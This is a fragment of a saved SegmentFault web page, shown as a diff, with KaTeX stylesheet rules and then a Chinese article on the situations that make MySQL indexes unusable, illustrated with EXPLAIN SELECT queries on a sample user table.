+  font-size: 0.41666667em;
+}
+.katex .sizing.reset-size8.size3,
+.katex .fontsize-ensurer.reset-size8.size3 {
+  font-size: 0.48611111em;
+}
+.katex .sizing.reset-size8.size4,
+.katex .fontsize-ensurer.reset-size8.size4 {
+  font-size: 0.55555556em;
+}
+.katex .sizing.reset-size8.size5,
+.katex .fontsize-ensurer.reset-size8.size5 {
+  font-size: 0.625em;
+}
+.katex .sizing.reset-size8.size6,
+.katex .fontsize-ensurer.reset-size8.size6 {
+  font-size: 0.69444444em;
+}
+.katex .sizing.reset-size8.size7,
+.katex .fontsize-ensurer.reset-size8.size7 {
+  font-size: 0.83333333em;
+}
+.katex .sizing.reset-size8.size8,
+.katex .fontsize-ensurer.reset-size8.size8 {
+  font-size: 1em;
+}
+.katex .sizing.reset-size8.size9,
+.katex .fontsize-ensurer.reset-size8.size9 {
+  font-size: 1.2em;
+}
+.katex .sizing.reset-size8.size10,
+.katex .fontsize-ensurer.reset-size8.size10 {
+  font-size: 1.44027778em;
+}
+.katex .sizing.reset-size8.size11,
+.katex .fontsize-ensurer.reset-size8.size11 {
+  font-size: 1.72777778em;
+}
+.katex .sizing.reset-size9.size1,
+.katex .fontsize-ensurer.reset-size9.size1 {
+  font-size: 0.28935185em;
+}
+.katex .sizing.reset-size9.size2,
+.katex .fontsize-ensurer.reset-size9.size2 {
+  font-size: 0.34722222em;
+}
+.katex .sizing.reset-size9.size3,
+.katex .fontsize-ensurer.reset-size9.size3 {
+  font-size: 0.40509259em;
+}
+.katex .sizing.reset-size9.size4,
+.katex .fontsize-ensurer.reset-size9.size4 {
+  font-size: 0.46296296em;
+}
+.katex .sizing.reset-size9.size5,
+.katex .fontsize-ensurer.reset-size9.size5 {
+  font-size: 0.52083333em;
+}
+.katex .sizing.reset-size9.size6,
+.katex .fontsize-ensurer.reset-size9.size6 {
+  font-size: 0.5787037em;
+}
+.katex .sizing.reset-size9.size7,
+.katex .fontsize-ensurer.reset-size9.size7 {
+  font-size: 0.69444444em;
+}
+.katex .sizing.reset-size9.size8,
+.katex .fontsize-ensurer.reset-size9.size8 {
+  font-size: 0.83333333em;
+}
+.katex .sizing.reset-size9.size9,
+.katex .fontsize-ensurer.reset-size9.size9 {
+  font-size: 1em;
+}
+.katex .sizing.reset-size9.size10,
+.katex .fontsize-ensurer.reset-size9.size10 {
+  font-size: 1.20023148em;
+}
+.katex .sizing.reset-size9.size11,
+.katex .fontsize-ensurer.reset-size9.size11 {
+  font-size: 1.43981481em;
+}
+.katex .sizing.reset-size10.size1,
+.katex .fontsize-ensurer.reset-size10.size1 {
+  font-size: 0.24108004em;
+}
+.katex .sizing.reset-size10.size2,
+.katex .fontsize-ensurer.reset-size10.size2 {
+  font-size: 0.28929605em;
+}
+.katex .sizing.reset-size10.size3,
+.katex .fontsize-ensurer.reset-size10.size3 {
+  font-size: 0.33751205em;
+}
+.katex .sizing.reset-size10.size4,
+.katex .fontsize-ensurer.reset-size10.size4 {
+  font-size: 0.38572806em;
+}
+.katex .sizing.reset-size10.size5,
+.katex .fontsize-ensurer.reset-size10.size5 {
+  font-size: 0.43394407em;
+}
+.katex .sizing.reset-size10.size6,
+.katex .fontsize-ensurer.reset-size10.size6 {
+  font-size: 0.48216008em;
+}
+.katex .sizing.reset-size10.size7,
+.katex .fontsize-ensurer.reset-size10.size7 {
+  font-size: 0.57859209em;
+}
+.katex .sizing.reset-size10.size8,
+.katex .fontsize-ensurer.reset-size10.size8 {
+  font-size: 0.69431051em;
+}
+.katex .sizing.reset-size10.size9,
+.katex .fontsize-ensurer.reset-size10.size9 {
+  font-size: 0.83317261em;
+}
+.katex .sizing.reset-size10.size10,
+.katex .fontsize-ensurer.reset-size10.size10 {
+  font-size: 1em;
+}
+.katex .sizing.reset-size10.size11,
+.katex .fontsize-ensurer.reset-size10.size11 {
+  font-size: 1.19961427em;
+}
+.katex .sizing.reset-size11.size1,
+.katex .fontsize-ensurer.reset-size11.size1 {
+  font-size: 0.20096463em;
+}
+.katex .sizing.reset-size11.size2,
+.katex .fontsize-ensurer.reset-size11.size2 {
+  font-size: 0.24115756em;
+}
+.katex .sizing.reset-size11.size3,
+.katex .fontsize-ensurer.reset-size11.size3 {
+  font-size: 0.28135048em;
+}
+.katex .sizing.reset-size11.size4,
+.katex .fontsize-ensurer.reset-size11.size4 {
+  font-size: 0.32154341em;
+}
+.katex .sizing.reset-size11.size5,
+.katex .fontsize-ensurer.reset-size11.size5 {
+  font-size: 0.36173633em;
+}
+.katex .sizing.reset-size11.size6,
+.katex .fontsize-ensurer.reset-size11.size6 {
+  font-size: 0.40192926em;
+}
+.katex .sizing.reset-size11.size7,
+.katex .fontsize-ensurer.reset-size11.size7 {
+  font-size: 0.48231511em;
+}
+.katex .sizing.reset-size11.size8,
+.katex .fontsize-ensurer.reset-size11.size8 {
+  font-size: 0.57877814em;
+}
+.katex .sizing.reset-size11.size9,
+.katex .fontsize-ensurer.reset-size11.size9 {
+  font-size: 0.69453376em;
+}
+.katex .sizing.reset-size11.size10,
+.katex .fontsize-ensurer.reset-size11.size10 {
+  font-size: 0.83360129em;
+}
+.katex .sizing.reset-size11.size11,
+.katex .fontsize-ensurer.reset-size11.size11 {
+  font-size: 1em;
+}
+.katex .delimsizing.size1 {
+  font-family: KaTeX_Size1;
+}
+.katex .delimsizing.size2 {
+  font-family: KaTeX_Size2;
+}
+.katex .delimsizing.size3 {
+  font-family: KaTeX_Size3;
+}
+.katex .delimsizing.size4 {
+  font-family: KaTeX_Size4;
+}
+.katex .delimsizing.mult .delim-size1 > span {
+  font-family: KaTeX_Size1;
+}
+.katex .delimsizing.mult .delim-size4 > span {
+  font-family: KaTeX_Size4;
+}
+.katex .nulldelimiter {
+  display: inline-block;
+  width: 0.12em;
+}
+.katex .delimcenter {
+  position: relative;
+}
+.katex .op-symbol {
+  position: relative;
+}
+.katex .op-symbol.small-op {
+  font-family: KaTeX_Size1;
+}
+.katex .op-symbol.large-op {
+  font-family: KaTeX_Size2;
+}
+.katex .op-limits > .vlist-t {
+  text-align: center;
+}
+.katex .accent > .vlist-t {
+  text-align: center;
+}
+.katex .accent .accent-body {
+  position: relative;
+}
+.katex .accent .accent-body:not(.accent-full) {
+  width: 0;
+}
+.katex .overlay {
+  display: block;
+}
+.katex .mtable .vertical-separator {
+  display: inline-block;
+  min-width: 1px;
+}
+.katex .mtable .arraycolsep {
+  display: inline-block;
+}
+.katex .mtable .col-align-c > .vlist-t {
+  text-align: center;
+}
+.katex .mtable .col-align-l > .vlist-t {
+  text-align: left;
+}
+.katex .mtable .col-align-r > .vlist-t {
+  text-align: right;
+}
+.katex .svg-align {
+  text-align: left;
+}
+.katex svg {
+  display: block;
+  position: absolute;
+  width: 100%;
+  height: inherit;
+  fill: currentColor;
+  stroke: currentColor;
+  fill-rule: nonzero;
+  fill-opacity: 1;
+  stroke-width: 1;
+  stroke-linecap: butt;
+  stroke-linejoin: miter;
+  stroke-miterlimit: 4;
+  stroke-dasharray: none;
+  stroke-dashoffset: 0;
+  stroke-opacity: 1;
+}
+.katex svg path {
+  stroke: none;
+}
+.katex img {
+  border-style: none;
+  min-width: 0;
+  min-height: 0;
+  max-width: none;
+  max-height: none;
+}
+.katex .stretchy {
+  width: 100%;
+  display: block;
+  position: relative;
+  overflow: hidden;
+}
+.katex .stretchy::before,
+.katex .stretchy::after {
+  content: "";
+}
+.katex .hide-tail {
+  width: 100%;
+  position: relative;
+  overflow: hidden;
+}
+.katex .halfarrow-left {
+  position: absolute;
+  left: 0;
+  width: 50.2%;
+  overflow: hidden;
+}
+.katex .halfarrow-right {
+  position: absolute;
+  right: 0;
+  width: 50.2%;
+  overflow: hidden;
+}
+.katex .brace-left {
+  position: absolute;
+  left: 0;
+  width: 25.1%;
+  overflow: hidden;
+}
+.katex .brace-center {
+  position: absolute;
+  left: 25%;
+  width: 50%;
+  overflow: hidden;
+}
+.katex .brace-right {
+  position: absolute;
+  right: 0;
+  width: 25.1%;
+  overflow: hidden;
+}
+.katex .x-arrow-pad {
+  padding: 0 0.5em;
+}
+.katex .x-arrow,
+.katex .mover,
+.katex .munder {
+  text-align: center;
+}
+.katex .boxpad {
+  padding: 0 0.3em 0 0.3em;
+}
+.katex .fbox,
+.katex .fcolorbox {
+  box-sizing: border-box;
+  border: 0.04em solid;
+}
+.katex .cancel-pad {
+  padding: 0 0.2em 0 0.2em;
+}
+.katex .cancel-lap {
+  margin-left: -0.2em;
+  margin-right: -0.2em;
+}
+.katex .sout {
+  border-bottom-style: solid;
+  border-bottom-width: 0.08em;
+}
+.katex-display {
+  display: block;
+  margin: 1em 0;
+  text-align: center;
+}
+.katex-display > .katex {
+  display: block;
+  text-align: center;
+  white-space: nowrap;
+}
+.katex-display > .katex > .katex-html {
+  display: block;
+  position: relative;
+}
+.katex-display > .katex > .katex-html > .tag {
+  position: absolute;
+  right: 0;
+}
+.katex-display.leqno > .katex > .katex-html > .tag {
+  left: 0;
+  right: auto;
+}
+.katex-display.fleqn > .katex {
+  text-align: left;
+  padding-left: 2em;
+}
+</style><link rel="stylesheet" type="text/css" href="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/7.chunk.css"><script charset="utf-8" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/7.js.下载"></script><script charset="utf-8" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/8.js.下载"></script><link rel="preload" href="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/f(7).txt" as="script"><script type="text/javascript" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/f(7).txt"></script></head>
+  <body>
+    <div id="root"><style></style><div class="d-none d-lg-block text-center"><div id="OA_holder_5" class="ad-container" style="display:none"><div id="beacon_c3503ed8a7" style="position: absolute; left: 0px; top: 0px; visibility: hidden;"><img src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/lg.php" width="0" height="0" alt="" style="width: 0px; height: 0px;"></div>
+</div></div><div id="root-top-container"></div><nav id="sf-header" class="bg-white shadow-sm sticky-top navbar navbar-expand-lg navbar-light"><div class="container"><div class="left-wrap d-flex justify-content-center"><a href="https://segmentfault.com/" class="navbar-brand"><img src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/logo-b.d865fc97.svg" width="139" height="26" class="d-inline-block" alt="segmentfault"></a></div><a class="btn btn-primary d-lg-none ml-auto mr-2" href="https://segmentfault.com/user/login">注册登录</a><button aria-controls="basic-navbar-nav" type="button" aria-label="Toggle navigation" class="navbar-toggler collapsed"><span class="navbar-toggler-icon"></span></button><div class="justify-content-between navbar-collapse collapse" id="basic-navbar-nav"><div class="font-weight-bold navbar-nav"><a href="https://segmentfault.com/" data-rb-event-key="/" class="nav-link">首页</a><a href="https://segmentfault.com/questions" data-rb-event-key="/questions" class="nav-link">问答</a><a href="https://segmentfault.com/blogs" data-rb-event-key="/blogs" class="nav-link">专栏</a><a href="https://ke.segmentfault.com/" target="_blank" rel="noreferrer" class="nav-link">课程<i class="ml-1 text-danger fas fa-fire-alt" style="width:0.88rem;vertical-align:text-bottom"></i></a><a href="https://segmentfault.com/events" data-rb-event-key="/events" class="nav-link">活动</a><div class="hover-down nav-item dropdown"><a aria-haspopup="true" aria-expanded="false" id="basic-nav-dropdown" href="https://segmentfault.com/a/1190000021464570?utm_source=sf-similar-article#" class="dropdown-toggle nav-link" role="button">发现</a></div></div><form action="https://segmentfault.com/search" class="d-none d-xl-block px-3 header-search___28AtS form-inline"><input type="text" name="q" placeholder="搜索关键字" aria-label="搜索" class="mr-sm-2 w-100 form-control"></form><nav class="p-0 navbar navbar-expand navbar-light"><div class="d-none d-lg-flex mr-2 nav-item"><a href="https://segmentfault.com/user/login" class="btn btn-primary">注册登录</a></div></nav></div></div></nav><div class="d-none d-xl-flex justify-content-center" style="display: block;"><div id="OA_holder_2" class="ad-container" style="display:block"><div id="beacon_1c948d40a4" style="position: absolute; left: 0px; top: 0px; visibility: hidden;"><img src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/lg(1).php" width="0" height="0" alt="" style="width: 0px; height: 0px;"></div>
+</div></div><div class="article-content container"><nav aria-label="breadcrumb" class="font-size-14 px-0 my-0 mx-4 mx-md-0"><ol class="breadcrumb bg-transparent"><li class="breadcrumb-item"><a href="https://segmentfault.com/">首页</a></li><li class="breadcrumb-item"><a href="https://segmentfault.com/blogs">专栏</a></li><li class="breadcrumb-item"><a href="https://segmentfault.com/t/mysql/blogs">mysql</a></li><li class="breadcrumb-item active" aria-current="page">文章详情</li></ol></nav><div class="row"><div class="col-12 col-xl w-0 col"><div class="sticky-wrap sticky-top functional-area-left d-none d-xl-flex justify-content-center pt-5 functional-area-left2"><div role="group" class="align-items-center btn-group-vertical"><button aria-label="点赞" type="button" class="func-btn mainLike  sflex-center shadow-sm rounded-circle main-lg-Like mb-3 btn btn-outline-primary"><i class="far fa-thumbs-up"></i><span class="mainLikeNum ">34</span></button><button aria-label="收藏" type="button" class="func-btn sflex-center rounded-circle mb-2 btn btn-outline-secondary"><i class="far fa-bookmark"></i></button><a class="func-btn sflex-center btn btn-outline-secondary rounded-circle mb-2" href="https://segmentfault.com/a/1190000021464570?utm_source=sf-similar-article#comment-area" aria-label="评论"><i class="far fa-comment-alt-lines"></i></a><div class="dropdown"><a href="https://segmentfault.com/a/1190000021464570?utm_source=sf-similar-article#" class="func-btn nav-tab-item  rounded-pill btn btn-outline-secondary sflex-center rounded-circle dropdown-toggle" aria-label="分享"><i class="far fa-share-alt"></i></a></div></div></div><canvas hidden="" class="qrcode" height="148" width="148" style="height: 148px; width: 148px;"></canvas><div class="mb-4 card"><div class="p-lg-30 position-relative card-body"><h1 class="h2 mb-3"><a href="https://segmentfault.com/a/1190000021464570" class="text-body">一张图搞懂MySQL的索引失效</a></h1><div class="d-flex align-items-center justify-content-between flex-wrap mb-4"><div class="d-flex align-items-center"><a href="https://segmentfault.com/u/zhangdejian" class="d-flex align-items-center"><picture class="mr-2 d-sm-block d-none"><img src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/93059368-5e0ade65df70d_huge128" alt="" class="d-inline-block rounded-circle" width="32"></picture><strong class="align-self-center font-size-14">张德Talk</strong></a><time class="text-secondary font-size-14" datetime="2020-01-02T05:21:31.000Z" itemprop="datePublished" style="margin-left:12px">发布于 <!-- -->2020-01-02 </time></div></div><div id="OA_holder_25" class="ad-container" style="display:block"><div id="beacon_caf91d53d8" style="position: absolute; left: 0px; top: 0px; visibility: hidden;"><img src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/lg(2).php" width="0" height="0" alt="" style="width: 0px; height: 0px;"></div>
+</div><article class="article fmt article-content ">
+<blockquote>索引对于MySQL而言，是非常重要的篇章。索引知识点也巨多，要想掌握透彻，需要逐个知识点一一击破，今天来先来聊聊哪些情况下会导致索引失效。</blockquote>
+<h2 id="item-1">图片总结版</h2>
+<p><span class="img-wrap"><img class="lazy entered loaded" referrerpolicy="no-referrer" data-src="/img/remote/1460000021464574" alt="索引失效的情况" title="索引失效的情况" data-ll-status="loaded" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/1460000021464574"></span></p>
+<h2 id="item-2">全值匹配（索引最佳）</h2>
+<div class="widget-codetool" style="display: none;">
+        <div class="widget-codetool--inner">
+        <button type="button" class="btn btn-dark far fa-copy rounded-0 sflex-center copyCode" data-toggle="tooltip" data-placement="top" data-clipboard-text="explain select * from user where name = &#39;zhangsan&#39; and age = 20 and pos = &#39;cxy&#39; and phone = &#39;18730658760&#39;;" title="" data-original-title="复制"></button>
+        </div>
+        </div><pre class="hljs pgsql"><code style="word-break: break-word; white-space: initial;"><span class="hljs-keyword">explain</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">'zhangsan'</span> <span class="hljs-keyword">and</span> age = <span class="hljs-number">20</span> <span class="hljs-keyword">and</span> pos = <span class="hljs-string">'cxy'</span> <span class="hljs-keyword">and</span> phone = <span class="hljs-string">'18730658760'</span>;</code></pre>
+<p><span class="img-wrap"><img class="lazy entered loaded exited" referrerpolicy="no-referrer" data-src="/img/remote/1460000021464573" alt="索引失效的情况" title="索引失效的情况" data-ll-status="loaded" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/1460000021464573"></span></p>
+<div class="widget-codetool" style="display: none;">
+        <div class="widget-codetool--inner">
+        <button type="button" class="btn btn-dark far fa-copy rounded-0 sflex-center copyCode" data-toggle="tooltip" data-placement="top" data-clipboard-text="和索引顺序无关，MySQL底层的优化器会进行优化，调整索引的顺序
+explain select * from user where name = &#39;zhangsan&#39; and age = 20 and pos = &#39;cxy&#39; and phone = &#39;18730658760&#39;;" title="" data-original-title="复制"></button>
+        </div>
+        </div><pre class="hljs pgsql"><code>和索引顺序无关，MySQL底层的优化器会进行优化，调整索引的顺序
+<span class="hljs-keyword">explain</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">'zhangsan'</span> <span class="hljs-keyword">and</span> age = <span class="hljs-number">20</span> <span class="hljs-keyword">and</span> pos = <span class="hljs-string">'cxy'</span> <span class="hljs-keyword">and</span> phone = <span class="hljs-string">'18730658760'</span>;</code></pre>
+<p><span class="img-wrap"><img class="lazy entered loaded exited" referrerpolicy="no-referrer" data-src="/img/remote/1460000021464577" alt="索引失效的情况" title="索引失效的情况" data-ll-status="loaded" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/1460000021464577"></span></p>
+<h2 id="item-3">1、违反最左前缀法则</h2>
+<div class="widget-codetool" style="display:none;">
+        <div class="widget-codetool--inner">
+        <button type="button" class="btn btn-dark far fa-copy rounded-0 sflex-center copyCode" data-toggle="tooltip" data-placement="top" data-clipboard-text="如果索引有多列，要遵守最左前缀法则
+即查询从索引的最左前列开始并且不跳过索引中的列
+explain select * from user where age = 20 and phone = &#39;18730658760&#39; and pos = &#39;cxy&#39;;" title="" data-original-title="复制"></button>
+        </div>
+        </div><pre class="hljs n1ql"><code>如果索引有多列，要遵守最左前缀法则
+即查询从索引的最左前列开始并且不跳过索引中的列
+<span class="hljs-keyword">explain</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> age = <span class="hljs-number">20</span> <span class="hljs-keyword">and</span> phone = <span class="hljs-string">'18730658760'</span> <span class="hljs-keyword">and</span> pos = <span class="hljs-string">'cxy'</span>;</code></pre>
+<p><span class="img-wrap"><img class="lazy entered loaded exited" referrerpolicy="no-referrer" data-src="/img/remote/1460000021464578" alt="索引失效的情况" title="索引失效的情况" data-ll-status="loaded" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/1460000021464578"></span></p>
+<h2 id="item-4">2、在索引列上做任何操作</h2>
+<div class="widget-codetool" style="display:none;">
+        <div class="widget-codetool--inner">
+        <button type="button" class="btn btn-dark far fa-copy rounded-0 sflex-center copyCode" data-toggle="tooltip" data-placement="top" data-clipboard-text="如计算、函数、（自动or手动）类型转换等操作，会导致索引失效从而全表扫描
+explain select * from user where left(name,5) = &#39;zhangsan&#39; and age = 20 and phone = &#39;18730658760&#39;;" title="" data-original-title="复制"></button>
+        </div>
+        </div><pre class="hljs pgsql"><code>如计算、函数、（自动<span class="hljs-keyword">or</span>手动）类型转换等操作，会导致索引失效从而全表扫描
+<span class="hljs-keyword">explain</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> left(<span class="hljs-type">name</span>,<span class="hljs-number">5</span>) = <span class="hljs-string">'zhangsan'</span> <span class="hljs-keyword">and</span> age = <span class="hljs-number">20</span> <span class="hljs-keyword">and</span> phone = <span class="hljs-string">'18730658760'</span>;</code></pre>
+<p><span class="img-wrap"><img class="lazy entered loaded exited" referrerpolicy="no-referrer" data-src="/img/remote/1460000021464576" alt="索引失效的情况" title="索引失效的情况" data-ll-status="loaded" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/1460000021464576"></span></p>
+<h2 id="item-5">3、索引范围条件右边的列</h2>
+<div class="widget-codetool" style="display:none;">
+        <div class="widget-codetool--inner">
+        <button type="button" class="btn btn-dark far fa-copy rounded-0 sflex-center copyCode" data-toggle="tooltip" data-placement="top" data-clipboard-text="索引范围条件右边的索引列会失效
+explain select * from user where name = &#39;zhangsan&#39; and age &gt; 20 and pos = &#39;cxy&#39;;" title="" data-original-title="复制"></button>
+        </div>
+        </div><pre class="hljs pgsql"><code>索引范围条件右边的索引列会失效
+<span class="hljs-keyword">explain</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">'zhangsan'</span> <span class="hljs-keyword">and</span> age &gt; <span class="hljs-number">20</span> <span class="hljs-keyword">and</span> pos = <span class="hljs-string">'cxy'</span>;</code></pre>
+<p><span class="img-wrap"><img class="lazy entered loaded exited" referrerpolicy="no-referrer" data-src="/img/remote/1460000021464575" alt="索引失效的情况" title="索引失效的情况" data-ll-status="loaded" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/1460000021464575"></span></p>
+<h2 id="item-6">4、尽量使用覆盖索引</h2>
+<div class="widget-codetool" style="display: none;">
+        <div class="widget-codetool--inner">
+        <button type="button" class="btn btn-dark far fa-copy rounded-0 sflex-center copyCode" data-toggle="tooltip" data-placement="top" data-clipboard-text="只访问索引查询（索引列和查询列一致），减少select*
+explain select name,age,pos,phone from user where age = 20;" title="" data-original-title="复制"></button>
+        </div>
+        </div><pre class="hljs pgsql"><code>只访问索引查询（索引列和查询列一致），减少<span class="hljs-keyword">select</span>*
+<span class="hljs-keyword">explain</span> <span class="hljs-keyword">select</span> <span class="hljs-type">name</span>,age,pos,phone <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> age = <span class="hljs-number">20</span>;</code></pre>
+<p><span class="img-wrap"><img class="lazy entered loaded exited" referrerpolicy="no-referrer" data-src="/img/remote/1460000021464579" alt="索引失效的情况" title="索引失效的情况" data-ll-status="loaded" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/1460000021464579"></span></p>
+<h2 id="item-7">5、使用不等于（!=、&lt;&gt;）</h2>
+<div class="widget-codetool" style="display:none;">
+        <div class="widget-codetool--inner">
+        <button type="button" class="btn btn-dark far fa-copy rounded-0 sflex-center copyCode" data-toggle="tooltip" data-placement="top" data-clipboard-text="mysql在使用不等于（!=、&lt;&gt;）的时候无法使用索引会导致全表扫描（除覆盖索引外）
+explain select * from user where age != 20;
+explain select * from user where age &lt;&gt; 20;" title="" data-original-title="复制"></button>
+        </div>
+        </div><pre class="hljs n1ql"><code>mysql在使用不等于（!=、&lt;&gt;）的时候无法使用索引会导致全表扫描（除覆盖索引外）
+<span class="hljs-keyword">explain</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> age != <span class="hljs-number">20</span>;
+<span class="hljs-keyword">explain</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> age &lt;&gt; <span class="hljs-number">20</span>;</code></pre>
+<p><span class="img-wrap"><img class="lazy entered loaded exited" referrerpolicy="no-referrer" data-src="/img/remote/1460000021464580" alt="索引失效的情况" title="索引失效的情况" data-ll-status="loaded" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/1460000021464580"></span></p>
+<p><span class="img-wrap"><img class="lazy entered loaded exited" referrerpolicy="no-referrer" data-src="/img/remote/1460000021464581" alt="索引失效的情况" title="索引失效的情况" data-ll-status="loaded" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/1460000021464581"></span></p>
+<h2 id="item-8">6、like以通配符开头（'%abc'）</h2>
+<div class="widget-codetool" style="display:none;">
+        <div class="widget-codetool--inner">
+        <button type="button" class="btn btn-dark far fa-copy rounded-0 sflex-center copyCode" data-toggle="tooltip" data-placement="top" data-clipboard-text="索引失效
+explain select * from user where name like &#39;%zhangsan&#39;;" title="" data-original-title="复制"></button>
+        </div>
+        </div><pre class="hljs pgsql"><code>索引失效
+<span class="hljs-keyword">explain</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> <span class="hljs-keyword">like</span> <span class="hljs-string">'%zhangsan'</span>;</code></pre>
+<p><span class="img-wrap"><img class="lazy entered loaded exited" referrerpolicy="no-referrer" data-src="/img/remote/1460000021464584" alt="索引失效的情况" title="索引失效的情况" data-ll-status="loaded" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/1460000021464584"></span></p>
+<div class="widget-codetool" style="display: none;">
+        <div class="widget-codetool--inner">
+        <button type="button" class="btn btn-dark far fa-copy rounded-0 sflex-center copyCode" data-toggle="tooltip" data-placement="top" data-clipboard-text="索引生效
+explain select * from user where name like &#39;zhangsan%&#39;;" title="" data-original-title="复制"></button>
+        </div>
+        </div><pre class="hljs pgsql"><code>索引生效
+<span class="hljs-keyword">explain</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> <span class="hljs-keyword">like</span> <span class="hljs-string">'zhangsan%'</span>;</code></pre>
+<p><span class="img-wrap"><img class="lazy entered loaded exited" referrerpolicy="no-referrer" data-src="/img/remote/1460000021464582" alt="索引失效的情况" title="索引失效的情况" data-ll-status="loaded" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/1460000021464582"></span></p>
+<h2 id="item-9">7、字符串不加单引号索引失效</h2>
+<div class="widget-codetool" style="display:none;">
+        <div class="widget-codetool--inner">
+        <button type="button" class="btn btn-dark far fa-copy rounded-0 sflex-center copyCode" data-toggle="tooltip" data-placement="top" data-clipboard-text="explain select * from user where name = 2000;" title="" data-original-title="复制"></button>
+        </div>
+        </div><pre class="hljs pgsql"><code style="word-break: break-word; white-space: initial;"><span class="hljs-keyword">explain</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-number">2000</span>;</code></pre>
+<p><span class="img-wrap"><img class="lazy entered loaded exited" referrerpolicy="no-referrer" data-src="/img/remote/1460000021464583" alt="索引失效的情况" title="索引失效的情况" data-ll-status="loaded" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/1460000021464583"></span></p>
+<h2 id="item-10">8、or连接</h2>
+<div class="widget-codetool" style="display:none;">
+        <div class="widget-codetool--inner">
+        <button type="button" class="btn btn-dark far fa-copy rounded-0 sflex-center copyCode" data-toggle="tooltip" data-placement="top" data-clipboard-text="少用or
+explain select * from user where name = &#39;2000&#39; or age = 20 or pos =&#39;cxy&#39;;" title="" data-original-title="复制"></button>
+        </div>
+        </div><pre class="hljs pgsql"><code>少用<span class="hljs-keyword">or</span>
+<span class="hljs-keyword">explain</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">'2000'</span> <span class="hljs-keyword">or</span> age = <span class="hljs-number">20</span> <span class="hljs-keyword">or</span> pos =<span class="hljs-string">'cxy'</span>;</code></pre>
+<p><span class="img-wrap"><img class="lazy entered loaded exited" referrerpolicy="no-referrer" data-src="/img/remote/1460000021464588" alt="索引失效的情况" title="索引失效的情况" data-ll-status="loaded" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/1460000021464588"></span></p>
+<h2 id="item-11">9、order by</h2>
+<div class="widget-codetool" style="display:none;">
+        <div class="widget-codetool--inner">
+        <button type="button" class="btn btn-dark far fa-copy rounded-0 sflex-center copyCode" data-toggle="tooltip" data-placement="top" data-clipboard-text="正常（索引参与了排序）
+explain select * from user where name = &#39;zhangsan&#39; and age = 20 order by age,pos;
+备注：索引有两个作用：排序和查找" title="" data-original-title="复制"></button>
+        </div>
+        </div><pre class="hljs pgsql"><code>正常（索引参与了排序）
+<span class="hljs-keyword">explain</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">'zhangsan'</span> <span class="hljs-keyword">and</span> age = <span class="hljs-number">20</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> age,pos;
+备注：索引有两个作用：排序和查找</code></pre>
+<p><span class="img-wrap"><img class="lazy entered loaded exited" referrerpolicy="no-referrer" data-src="/img/remote/1460000021464586" alt="索引失效的情况" title="索引失效的情况" data-ll-status="loaded" src="./一张图搞懂MySQL的索引失效 - SegmentFault 思否_files/1460000021464586"></span></p>
+<div class="widget-codetool" style="display: none;">
+        <div class="widget-codetool--inner">
+        <button type="button" class="btn btn-dark far fa-copy rounded-0 sflex-center copyCode" data-toggle="tooltip" data-placement="top" data-clipboard-text="导致额外的文件排序（会降低性能）
+explain select name,age from user where name = &#39;zhangsan&#39; order by pos;//违反最左前缀法则
+explain select name,age from user where name = &#39;zhangsan&#39; order by pos,age;//违反最左前缀法则
+explain select * from user where name = &#39;zhangsan&#39; and age = 20 order by created_time,age;//含非索引字段" title="" data-original-title="复制"></button>
+        </div>
